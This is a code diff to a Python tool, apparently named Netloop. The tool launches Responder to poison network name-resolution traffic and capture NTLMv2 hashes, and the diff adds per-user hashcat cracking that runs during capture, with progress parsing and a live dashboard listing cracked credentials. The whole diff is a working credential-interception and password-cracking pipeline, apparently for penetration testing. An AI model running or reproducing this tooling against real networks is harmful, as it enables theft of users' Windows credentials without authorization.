@@ -66,8 +66,85 @@ class Stats:
     seen_hashes: Set[str] = field(default_factory=set)
 
 
+@dataclass
+class CrackState:
+    pending_users: List[str] = field(default_factory=list)
+    queued_users: Set[str] = field(default_factory=set)
+    processed_users: Set[str] = field(default_factory=set)
+    active_user: Optional[str] = None
+    active_hash_file: Optional[Path] = None
+    active_proc: Optional[subprocess.Popen[str]] = None
+    active_percent: float = 0.0
+    active_rate_hps: float = 0.0
+    active_status: str = "idle"
+    cracked_lines: List[str] = field(default_factory=list)
+    cracked_seen: Set[str] = field(default_factory=set)
+    completed_jobs: int = 0
+    hashcat_errors: int = 0
+
+
 def strip_ansi(text: str) -> str:
     return ANSI_RE.sub("", text)
+
+
+def sanitize_for_filename(value: str) -> str:
+    return re.sub(r"[^A-Za-z0-9._-]", "_", value)
+
+
+def build_progress_bar(percent: float, width: int = 24) -> str:
+    bounded = max(0.0, min(100.0, percent))
+    fill = int((bounded / 100.0) * width)
+    bar = "#" * fill + "-" * (width - fill)
+    return f"[{bar}] {bounded:6.2f}%"
+
+
+def parse_hashcat_progress(status_json: dict) -> Optional[float]:
+    progress = status_json.get("progress")
+    if isinstance(progress, list) and len(progress) >= 2:
+        done, total = progress[0], progress[1]
+        if isinstance(done, (int, float)) and isinstance(total, (int, float)) and total > 0:
+            return float(done) * 100.0 / float(total)
+    if isinstance(progress, (int, float)):
+        total = status_json.get("progress_total")
+        if isinstance(total, (int, float)) and total > 0:
+            return float(progress) * 100.0 / float(total)
+    return None
+
+
+def parse_hashcat_rate_hps(status_json: dict) -> Optional[float]:
+    speed_value = status_json.get("speed")
+    if speed_value is None:
+        speed_value = status_json.get("speed_sec")
+
+    if isinstance(speed_value, (int, float)):
+        return float(speed_value)
+
+    if isinstance(speed_value, list):
+        total = 0.0
+        found = False
+        for item in speed_value:
+            if isinstance(item, (int, float)):
+                total += float(item)
+                found = True
+            elif isinstance(item, list) and item:
+                # Some hashcat status formats include [value, unit] tuples.
+                val = item[0]
+                if isinstance(val, (int, float)):
+                    total += float(val)
+                    found = True
+        if found:
+            return total
+    return None
+
+
+def humanize_hps(rate_hps: float) -> str:
+    if rate_hps < 1_000:
+        return f"{rate_hps:.0f} H/s"
+    if rate_hps < 1_000_000:
+        return f"{rate_hps / 1_000:.2f} kH/s"
+    if rate_hps < 1_000_000_000:
+        return f"{rate_hps / 1_000_000:.2f} MH/s"
+    return f"{rate_hps / 1_000_000_000:.2f} GH/s"
 
 
 def load_config() -> dict:
@@ -203,6 +280,157 @@ def read_hashes_from_files(session_dir: Path, stats: Stats) -> None:
                 continue
 
 
+def enqueue_new_hashes_for_cracking(stats: Stats, crack_state: CrackState) -> None:
+    for user in sorted(stats.user_to_hash.keys()):
+        if user in crack_state.processed_users:
+            continue
+        if user == crack_state.active_user:
+            continue
+        if user in crack_state.queued_users:
+            continue
+        crack_state.pending_users.append(user)
+        crack_state.queued_users.add(user)
+
+
+def start_next_hashcat_job(
+    crack_state: CrackState,
+    stats: Stats,
+    hashcat_path: str,
+    hashcat_flags: List[str],
+    wordlist: str,
+    session_dir: Path,
+    session_name_prefix: str,
+) -> None:
+    if crack_state.active_proc is not None:
+        return
+    if not crack_state.pending_users:
+        return
+
+    user = crack_state.pending_users.pop(0)
+    user_hash = stats.user_to_hash.get(user)
+    if not user_hash:
+        crack_state.queued_users.discard(user)
+        return
+
+    hash_dir = session_dir / "hash_inputs"
+    hash_dir.mkdir(parents=True, exist_ok=True)
+    safe_user = sanitize_for_filename(user)
+    hash_file = hash_dir / f"{safe_user}.txt"
+    hash_file.write_text(user_hash + "\n", encoding="utf-8")
+
+    crack_state.active_user = user
+    crack_state.active_hash_file = hash_file
+    crack_state.active_percent = 0.0
+    crack_state.active_status = "running"
+
+    cmd = [
+        hashcat_path,
+        *hashcat_flags,
+        "--session",
+        f"{session_name_prefix}-{safe_user}-{int(time.time())}",
+        "--restore-disable",
+        "--status",
+        "--status-json",
+        "--status-timer",
+        "1",
+        "--potfile-path",
+        str(session_dir / "netloop.potfile"),
+        str(hash_file),
+        wordlist,
+    ]
+    crack_state.active_proc = subprocess.Popen(
+        cmd,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        text=True,
+        bufsize=1,
+    )
+
+
+def poll_hashcat_state(crack_state: CrackState) -> None:
+    proc = crack_state.active_proc
+    if proc is None or proc.stdout is None:
+        return
+
+    fd = proc.stdout.fileno()
+    while True:
+        ready, _, _ = select.select([fd], [], [], 0)
+        if not ready:
+            break
+        line = proc.stdout.readline()
+        if not line:
+            break
+        clean = strip_ansi(line).strip()
+        if not clean:
+            continue
+        try:
+            status_json = json.loads(clean)
+        except json.JSONDecodeError:
+            continue
+        percent = parse_hashcat_progress(status_json)
+        if percent is not None:
+            crack_state.active_percent = percent
+            crack_state.active_status = str(status_json.get("status", "running"))
+        rate_hps = parse_hashcat_rate_hps(status_json)
+        if rate_hps is not None:
+            crack_state.active_rate_hps = rate_hps
+
+
+def finalize_hashcat_job(
+    crack_state: CrackState,
+    hashcat_path: str,
+    hashcat_flags: List[str],
+) -> None:
+    proc = crack_state.active_proc
+    user = crack_state.active_user
+    hash_file = crack_state.active_hash_file
+    if proc is None or user is None or hash_file is None:
+        return
+
+    if proc.stdout is not None:
+        # Drain remaining output, harvesting final status JSON if present.
+        for line in proc.stdout:
+            clean = strip_ansi(line).strip()
+            if not clean:
+                continue
+            try:
+                status_json = json.loads(clean)
+            except json.JSONDecodeError:
+                continue
+            percent = parse_hashcat_progress(status_json)
+            if percent is not None:
+                crack_state.active_percent = percent
+                crack_state.active_status = str(status_json.get("status", crack_state.active_status))
+            rate_hps = parse_hashcat_rate_hps(status_json)
+            if rate_hps is not None:
+                crack_state.active_rate_hps = rate_hps
+
+    rc = proc.wait()
+    if rc != 0:
+        crack_state.hashcat_errors += 1
+
+    show_cmd = [hashcat_path, *hashcat_flags, "--show", str(hash_file)]
+    show_proc = subprocess.run(show_cmd, text=True, capture_output=True)
+    for row in show_proc.stdout.splitlines():
+        clean_row = strip_ansi(row).strip()
+        if not clean_row:
+            continue
+        if clean_row in crack_state.cracked_seen:
+            continue
+        crack_state.cracked_seen.add(clean_row)
+        crack_state.cracked_lines.append(clean_row)
+
+    crack_state.completed_jobs += 1
+    crack_state.processed_users.add(user)
+    crack_state.queued_users.discard(user)
+    crack_state.active_user = None
+    crack_state.active_hash_file = None
+    crack_state.active_proc = None
+    crack_state.active_percent = 0.0
+    crack_state.active_rate_hps = 0.0
+    crack_state.active_status = "idle"
+
+
 def render_stats(stats: Stats, live: bool = False) -> None:
     prefix = "LIVE" if live else "FINAL"
     status = (
@@ -216,6 +444,7 @@ def render_stats(stats: Stats, live: bool = False) -> None:
 
 def render_live_dashboard(
     stats: Stats,
+    crack_state: CrackState,
     interface: str,
     responder_flags: str,
     started_at: float,
@@ -227,6 +456,19 @@ def render_live_dashboard(
         remaining = max(0, auto_stop_seconds - elapsed)
         timer_text = f"{elapsed}s elapsed | {remaining}s to auto-stop"
 
+    cracking_line = c("Cracking: idle", Color.YELLOW)
+    if crack_state.active_user:
+        bar = build_progress_bar(crack_state.active_percent)
+        rate_text = humanize_hps(crack_state.active_rate_hps)
+        cracking_line = (
+            f"Cracking user: {c(crack_state.active_user, Color.CYAN)} "
+            f"{c(bar, Color.GREEN)} | Rate: {c(rate_text, Color.BLUE)}"
+        )
+
+    queue_depth = len(crack_state.pending_users) + (1 if crack_state.active_user else 0)
+    recent_cracks = crack_state.cracked_lines[-2:]
+    recent_lines = [f"  {line}" for line in recent_cracks] if recent_cracks else ["  none yet"]
+
     return [
         c("Netloop Live Overview", Color.BOLD),
         f"Mode: NTLMv2 capture/crack | Interface: {interface}",
@@ -237,7 +479,15 @@ def render_live_dashboard(
         f"NTLMv2 hashes captured: {c(str(stats.ntlmv2_hash_lines), Color.GREEN)}",
         f"Unique users captured: {c(str(len(stats.unique_users)), Color.BLUE)}",
         "",
-        c("Press Ctrl-C to stop capture and start cracking.", Color.CYAN),
+        cracking_line,
+        (
+            f"Crack queue: {queue_depth} | Completed jobs: {crack_state.completed_jobs} | "
+            f"Cracked: {len(crack_state.cracked_lines)}"
+        ),
+        "Recent cracked:",
+        *recent_lines,
+        "",
+        c("Ctrl-C: stop responder capture (cracking continues).", Color.CYAN),
     ]
 
 
@@ -263,17 +513,22 @@ def draw_live_dashboard(lines: List[str], previous_line_count: int) -> int:
     return len(lines)
 
 
-def run_responder(
+def run_capture_and_crack(
     interface: str,
     responder_flags: str,
+    wordlist: str,
+    hashcat_flags: str,
     session_dir: Path,
     stats: Stats,
     auto_stop_seconds: int,
-) -> int:
+) -> Tuple[int, CrackState]:
     responder_path = shutil.which("responder")
     if not responder_path:
         print(c("Error: responder not found in PATH.", Color.RED))
-        return 127
+        return 127, CrackState()
+
+    hashcat_path = shutil.which("hashcat")
+    hashcat_missing_warned = False
 
     cmd = [responder_path, "-I", interface] + shlex.split(responder_flags)
     print(c(f"Starting responder: {' '.join(cmd)}", Color.CYAN))
@@ -289,6 +544,9 @@ def run_responder(
     )
 
     start = time.time()
+    session_name_prefix = f"netloop-{datetime.now().strftime('%Y%m%d-%H%M%S')}"
+    parsed_hashcat_flags = shlex.split(hashcat_flags)
+    crack_state = CrackState()
     responder_logs = discover_responder_log_paths(session_dir)
     log_offsets: Dict[Path, int] = {}
     for log_path in responder_logs:
@@ -297,48 +555,91 @@ def run_responder(
         except OSError:
             log_offsets[log_path] = 0
 
-    dashboard_lines = render_live_dashboard(stats, interface, responder_flags, start, auto_stop_seconds)
+    dashboard_lines = render_live_dashboard(
+        stats, crack_state, interface, responder_flags, start, auto_stop_seconds
+    )
     dashboard_height = draw_live_dashboard(dashboard_lines, previous_line_count=0)
     auto_stop_triggered = False
     last_refresh = 0.0
+    responder_stop_requested = False
+    interrupted = False
+
     try:
         assert proc.stdout is not None
         fd = proc.stdout.fileno()
         while True:
-            ready, _, _ = select.select([fd], [], [], 0.25)
-            if ready:
-                line = proc.stdout.readline()
-                if line:
-                    parse_responder_stream_line(line.rstrip("\n"), stats)
-
-            poll_responder_logs(stats, log_offsets, responder_logs)
-
-            # Keep the live dashboard moving even with quiet/buffered output.
-            now = time.time()
-            if now - last_refresh >= 1.0:
-                dashboard_lines = render_live_dashboard(
-                    stats, interface, responder_flags, start, auto_stop_seconds
-                )
-                dashboard_height = draw_live_dashboard(
-                    dashboard_lines, previous_line_count=dashboard_height
-                )
-                last_refresh = now
-
-            if (
-                proc.poll() is None
-                and auto_stop_seconds > 0
-                and now - start >= auto_stop_seconds
-            ):
-                auto_stop_triggered = True
-                proc.send_signal(signal.SIGINT)
-
-            if proc.poll() is not None:
-                # Drain remaining buffered stdout, then exit.
-                remainder = proc.stdout.readline()
-                while remainder:
-                    parse_responder_stream_line(remainder.rstrip("\n"), stats)
-                    remainder = proc.stdout.readline()
+            try:
+                if proc.poll() is None:
+                    ready, _, _ = select.select([fd], [], [], 0.20)
+                    if ready:
+                        line = proc.stdout.readline()
+                        if line:
+                            parse_responder_stream_line(line.rstrip("\n"), stats)
                 poll_responder_logs(stats, log_offsets, responder_logs)
+
+                enqueue_new_hashes_for_cracking(stats, crack_state)
+
+                if hashcat_path and Path(wordlist).exists():
+                    if crack_state.active_proc is None:
+                        start_next_hashcat_job(
+                            crack_state,
+                            stats,
+                            hashcat_path,
+                            parsed_hashcat_flags,
+                            wordlist,
+                            session_dir,
+                            session_name_prefix,
+                        )
+                    poll_hashcat_state(crack_state)
+                    if crack_state.active_proc and crack_state.active_proc.poll() is not None:
+                        finalize_hashcat_job(crack_state, hashcat_path, parsed_hashcat_flags)
+                else:
+                    if not hashcat_missing_warned:
+                        hashcat_missing_warned = True
+                        if not hashcat_path:
+                            print(c("Warning: hashcat not found in PATH. Capture only mode.", Color.YELLOW))
+                        elif not Path(wordlist).exists():
+                            print(c(f"Warning: wordlist not found: {wordlist}. Capture only mode.", Color.YELLOW))
+
+                now = time.time()
+                if now - last_refresh >= 1.0:
+                    dashboard_lines = render_live_dashboard(
+                        stats, crack_state, interface, responder_flags, start, auto_stop_seconds
+                    )
+                    dashboard_height = draw_live_dashboard(
+                        dashboard_lines, previous_line_count=dashboard_height
+                    )
+                    last_refresh = now
+
+                if (
+                    proc.poll() is None
+                    and auto_stop_seconds > 0
+                    and now - start >= auto_stop_seconds
+                ):
+                    auto_stop_triggered = True
+                    responder_stop_requested = True
+                    proc.send_signal(signal.SIGINT)
+
+                if responder_stop_requested and proc.poll() is None:
+                    proc.send_signal(signal.SIGINT)
+
+                responder_finished = proc.poll() is not None
+                cracking_finished = crack_state.active_proc is None and not crack_state.pending_users
+                if responder_finished and cracking_finished:
+                    break
+            except KeyboardInterrupt:
+                # First Ctrl-C: stop only responder; keep cracking queue alive.
+                if not responder_stop_requested and proc.poll() is None:
+                    interrupted = True
+                    responder_stop_requested = True
+                    proc.send_signal(signal.SIGINT)
+                    continue
+                # Second Ctrl-C: hard stop everything.
+                interrupted = True
+                if proc.poll() is None:
+                    proc.send_signal(signal.SIGINT)
+                if crack_state.active_proc and crack_state.active_proc.poll() is None:
+                    crack_state.active_proc.send_signal(signal.SIGINT)
                 break
     except KeyboardInterrupt:
         interrupted = True
@@ -350,33 +651,19 @@ def run_responder(
             proc.kill()
             proc.wait()
 
+    if crack_state.active_proc and crack_state.active_proc.poll() is not None and hashcat_path:
+        finalize_hashcat_job(crack_state, hashcat_path, parsed_hashcat_flags)
+
     # Move to a clean line after in-place dashboard rendering and print stop reason.
     print()
     if auto_stop_triggered:
         print(c("Auto-stop timer reached. Stopping responder.", Color.YELLOW))
     elif interrupted:
-        print(c("Stopped by user. Starting crack phase.", Color.YELLOW))
+        print(c("Capture stopped by user.", Color.YELLOW))
 
-    if interrupted:
-        return 130
-    return proc.returncode or 0
-
-
-def run_hashcat(hash_file: Path, wordlist: str, hashcat_flags: str, session_dir: Path) -> Tuple[int, List[str]]:
-    hashcat_path = shutil.which("hashcat")
-    if not hashcat_path:
-        print(c("Error: hashcat not found in PATH.", Color.RED))
-        return 127, []
-
-    hashcat_cmd = [hashcat_path] + shlex.split(hashcat_flags) + [str(hash_file), wordlist]
-    print(c(f"\nRunning hashcat: {' '.join(hashcat_cmd)}", Color.CYAN))
-    crack_rc = subprocess.call(hashcat_cmd, cwd=str(session_dir))
-
-    show_cmd = [hashcat_path] + shlex.split(hashcat_flags) + ["--show", str(hash_file)]
-    print(c("\nCollecting cracked results...", Color.CYAN))
-    show_proc = subprocess.run(show_cmd, cwd=str(session_dir), text=True, capture_output=True)
-    cracked = [line.strip() for line in show_proc.stdout.splitlines() if line.strip()]
-    return crack_rc, cracked
+    if interrupted and proc.returncode is None:
+        return 130, crack_state
+    return (proc.returncode or 0), crack_state
 
 
 def format_cracked_rows(rows: List[str]) -> List[str]:
@@ -450,9 +737,11 @@ def main() -> int:
     print(c(f"Session directory: {session_dir}", Color.CYAN))
 
     stats = Stats()
-    responder_rc = run_responder(
+    responder_rc, crack_state = run_capture_and_crack(
         interface,
         responder_flags,
+        wordlist,
+        hashcat_flags,
         session_dir,
         stats,
         parsed_args.auto_stop_seconds,
@@ -470,20 +759,17 @@ def main() -> int:
         return 0 if responder_rc in (0, 130) else responder_rc
 
     unique_hash_file = write_unique_hash_file(session_dir, stats.user_to_hash)
-    print(c(f"Cracking one hash per user from: {unique_hash_file}", Color.CYAN))
-
-    if not Path(wordlist).exists():
-        print(c(f"Wordlist not found: {wordlist}", Color.RED))
-        return 1
-
-    crack_rc, cracked_rows = run_hashcat(unique_hash_file, wordlist, hashcat_flags, session_dir)
-    cracked_display = format_cracked_rows(cracked_rows)
+    cracked_display = format_cracked_rows(crack_state.cracked_lines)
+    crack_rc = 0 if crack_state.hashcat_errors == 0 else 1
 
     print("\n" + c("Overview", Color.BOLD))
     print(f"- Poisoned messages: {stats.poisoned_messages}")
     print(f"- NTLMv2 hashes captured: {stats.ntlmv2_hash_lines}")
     print(f"- Unique users with captured hashes: {len(stats.unique_users)}")
-    print(f"- Hashcat exit code: {crack_rc}")
+    print(f"- Hash input file (one per user): {unique_hash_file}")
+    print(f"- Hashcat jobs completed: {crack_state.completed_jobs}")
+    print(f"- Hashcat job errors: {crack_state.hashcat_errors}")
+    print(f"- Hashcat status code: {crack_rc}")
 
     if cracked_display:
         print(c("\nCracked hashes:", Color.GREEN))
